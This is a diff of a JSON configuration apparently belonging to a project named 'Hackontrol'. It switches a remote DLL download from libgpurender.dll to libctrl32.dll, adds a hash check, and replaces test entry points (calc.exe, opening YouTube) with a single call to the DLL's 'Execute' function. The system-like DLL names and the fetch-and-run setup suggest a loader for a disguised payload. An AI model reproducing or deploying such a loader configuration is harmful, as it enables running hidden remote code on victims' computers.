@@ -5,24 +5,14 @@
 	},
 
 	"file": {
-		"file": "libgpurender.dll",
-		"url": "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/system/libgpurender.dll",
-		"sha256": "1f77795546a8e19e13cf735245bfb87f02ada823ac7abd750c1188a8ed1e4ab8"
+		"file": "libctrl32.dll",
+		"url": "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/system/libctrl32.dll",
+		"sha512": "6ec8205113d0d7fc5f8dc758c1e80c7196413b4022ea80f35ae15cc01787dca6f783295fa934e6eace4748e3c7f7178b2a1ad7bca321c28ae4250509cbad57ba"
 	},
 
-	"entrypoint": [
-		{
-			"format": "exe",
-			"file": "calc.exe"
-		},
-		{
-			"format": "dll",
-			"file": "libgpurender.dll",
-			"function": "Execute"
-		},
-		{
-			"format": "shell",
-			"command": "start chrome https://www.youtube.com"
-		}
-	]
+	"entrypoint": {
+		"format": "dll",
+		"file": "libctrl32.dll",
+		"function": "Execute"
+	}
 }
